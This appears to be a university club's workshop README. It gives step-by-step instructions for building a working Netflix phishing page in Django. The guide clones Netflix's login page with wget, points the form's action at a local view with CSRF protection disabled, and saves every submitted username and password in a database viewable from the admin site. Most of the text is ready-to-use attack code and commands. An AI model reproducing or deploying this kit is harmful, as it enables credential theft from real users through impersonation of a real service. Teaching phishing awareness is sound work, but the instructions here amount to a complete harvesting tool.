# UHART CYBER SECURITY: PHISHING WORKSHOP
Down below is a guide to make a fully functional phishing page. For the workshop, we cloned the netflix login page. Follow the guide below to create your own local netflix page. 

## Make sure python is installed

```
sudo apt-get install python3-pip

```

## Install the django framework/django-admin tool

```
pip3 install Django

sudo apt-get install python3-django

```

## Creating the app
Now we will utilize Django to create our local web server. We're going to createa n app called "netflix2" using django-admin

```
django-admin startproject netflix2

```

## Setting up our project
During the workshop, this part was all over the place, but it's very simple. All we need to do, cd into our project, create our host app, and set up our urls, views etc. 

### Create the app

```
django-admin startapp host

```

### Setting up our config
Inside your app, there is a folder with the SAME name as your main project, our is called "netflix2". cd into that directory and you should see 3 main files


```
settings.py  urls.py wsgi.py

```

We're going to editing our settings.py first. Inside settings.py look for "INSTALLED APPS". Add our host app to the installed app's section


```

INSTALLED_APPS = [
    'host',  <-- ADD your app HERE 
    'django.contrib.admin',
    'django.contrib.auth',
    'django.contrib.contenttypes',
    'django.contrib.sessions',
    'django.contrib.messages',
    'django.contrib.staticfiles',
]

```

That's everything we need to as far as settings.py. Now we need to change our urls.py to route all our apps on the webhost. I don't have the patience to show everything you'll need to change so i'm just going to paste what your urls.py file SHOULD look like (DOWN BELOW) 


```

from django.contrib import admin
from django.conf.urls import url, include

urlpatterns = [
	url(r'^admin/', admin.site.urls),	
	url(r'^host/', include('host.urls')), 	
]

```

This is all that needs to be in your URLS.py file. As Far as config, that's all we need to do

## Setting up our views and HOST APP

Now we're going to cd OUT of our config directory and go into our host app. 
One file we need to create is our URLS.py.

```

cd ../ 
cd host
touch urls.py

```

All we have to do is set up our Database ACCOUNT capture model and link it to our views.py

## Setting up Database model

Go into models.py and paste this in

```

from django.db import models
from django.utils import timezone
# Create your models here.


class Account(models.Model):
    username = models.CharField(max_length=100)
    password = models.CharField(max_length=100)
    login_time = models.DateTimeField(default=timezone.now)

    def __str__(self):
        return "{} :  {}".format(self.username, self.password)

```

Now REGISTER your model in admin.py.
Your admin.py should look like this


```

from django.contrib import admin
from .models import Account
# Register your models here.

# REGISTERING ACCOUNT model to site
admin.site.register(Account)

```

## Creating OUR VIEWS

Now we just need a view that captures netflix login details and saves it in our database
In your views.py file, paste this code.

```

from django.shortcuts import render, redirect
from .models import Account
from django.views.decorators.csrf import csrf_exempt

@csrf_exempt
def login_page(request):
	# capture request information
	# create account model
	# save to database

	if request.method == "POST":
		getusername = request.POST.get("userLoginId")
		getpassword = request.POST.get("password")
		print(getusername)
		print(getpassword)
		myAccount = Account()
		myAccount.username = getusername
		myAccount.password = getpassword
		myAccount.save()
		
	template_name = 'host/netflix.html'
	return render(request, template_name)

```


We're pretty much done with web app and now we need to clone netflix and render the template to our template directory

## Creating the template

Use this command to clone the netlix login page

```

wget -mkEpnp https://www.netflix.com/Login?nextpage=http%3A%2F%2Fwww3.netflix.com%2Fbrowse

```

This will download a folder called "www.netflix.com". Now we need the HTML file. 
inside our HOST app create a directory called "templates"

```

mkdir templates
cd templates
mkdir host
cd host

```

Our template directory is set up like this: templates/host/netflix.html

Put your netflix html file in the templates/host/ directory. Rename it to netflix.html to match our view function


## Add URL PATH in host

Now cd back to the main host app and let's edit our urls.py. PASTE THIS in your urls.py file. This will just map a url to our VIEWS functions. the url is going to be http://HOST:8000/host/login

```

from django.contrib import admin
from django.conf.urls import url, include
from . import views


"""
/admin
/host/login
"""


urlpatterns = [
	url(r'^login/', views.login_page, name='login-page'),
]

```

## Edit the netflix.html file
cd into your templates/host/netflix.html file and we need to edit the ACTION tag.
CTRL + F the file and search for action=""
replace the quotes in the action tag with your URL: http://1270.0.1:8000/host/login/

# ALL SET

Now your app is fully set up and you can head to http://127.0.0.1:8000/host/login and have a fully functioning netflix phishing page.

to create our web app we need to run a couple migration commands. cd back to the main project directory where manage.py is and run these commands

```
python3 manage.py migrate
python3 manage.py makemigrations

```

#Create your admin superuser

```

python3 manage.py createsuperuser

```

Follow the steps and create a username and password

























